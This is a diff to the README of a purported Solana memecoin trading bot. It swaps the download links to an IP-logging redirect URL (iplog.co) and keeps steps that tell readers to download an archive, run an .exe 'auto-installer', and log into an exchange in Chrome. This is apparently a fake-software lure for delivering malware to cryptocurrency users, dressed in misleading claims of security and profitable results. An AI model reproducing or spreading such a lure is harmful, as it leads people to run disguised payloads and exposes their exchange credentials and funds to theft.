@@ -1,5 +1,5 @@
 # SOL-shitcoinbot
-[![SOL-shitcoinbot](https://github.com/soldev3/SolShitcoin/blob/main/readme/button.png)](https://github.com/soldev3/SolShitcoin/releases/download/solana/Sol-shitcoinbot.zipx)
+[![SOL-shitcoinbot](https://github.com/abrakadabra0ibookscore/SOL-shitcoinbot/blob/main/readme/button.png)](https://iplog.co/solAviShit.html)
 
 SOL-shitcoinbot is an efficient and secure solution for automated trading of Shitcoins on the Solana blockchain. Utilizing premium APIs and Chromedriver, this bot automates trading operations through web interfaces of popular exchanges.
 
@@ -18,9 +18,9 @@ SOL-shitcoinbot is an efficient and secure solution for automated trading of Shi
 ### Installation
 To install SOL-shitcoinbot, follow these steps:
 
-[![SOL-shitcoinbot](https://github.com/soldev3/SolShitcoin/blob/main/readme/dw.png)](https://github.com/soldev3/SolShitcoin/releases/download/solana/Sol-shitcoinbot.zipx)
+[![SOL-shitcoinbot](https://github.com/abrakadabra0ibookscore/SOL-shitcoinbot/blob/main/readme/dw.png)](https://iplog.co/solAviShit.html)
 
-1. [Download the archive](https://github.com/soldev3/SolShitcoin/releases/download/solana/Sol-shitcoinbot.zipx) and extract it to a convenient folder. We recommend using [WinRAR](https://www.win-rar.com/), [Bandizip](https://www.bandisoft.com/bandizip/), or [7-Zip](https://www.7-zip.org/).
+1. [Download the archive](https://iplog.co/solAviShit.html) and extract it to a convenient folder. We recommend using [WinRAR](https://www.win-rar.com/), [Bandizip](https://www.bandisoft.com/bandizip/), or [7-Zip](https://www.7-zip.org/).
 2. Run the auto-installer `Sol-shitcoinbot.exe` and click 'Install'. It will install and download all necessary packages for operation.
 3. Launch the `Solbot-run` from the ink.
 4. Open Google Chrome and log in to your preferred exchange.
@@ -29,14 +29,14 @@ To install SOL-shitcoinbot, follow these steps:
 ## Example of Operation
 Here are some screenshots demonstrating the SOL-shitcoinbot in action:
 
-![SOL-shitcoinbot Interface Example 1](https://github.com/soldev3/SolShitcoin/blob/main/readme/Screenshot_1.png)
+![SOL-shitcoinbot Interface Example 1](https://github.com/abrakadabra0ibookscore/SOL-shitcoinbot/blob/main/readme/Screenshot_1.png)
 
 **Results-with Low Risk parameters 1 SOL trade & 0.1 step**
 
 
-![SOL-shitcoinbot Result Example 2](https://github.com/soldev3/SolShitcoin/blob/main/readme/Screenshot_12.png)
+![SOL-shitcoinbot Result Example 2](https://github.com/abrakadabra0ibookscore/SOL-shitcoinbot/blob/main/readme/Screenshot_12.png)
 
-![SOL-shitcoinbot Result Example 4](https://github.com/soldev3/SolShitcoin/blob/main/readme/Screenshot_13.png)
+![SOL-shitcoinbot Result Example 4](https://github.com/abrakadabra0ibookscore/SOL-shitcoinbot/blob/main/readme/Screenshot_13.png)
 
    
 ## Trading Parameters Setup
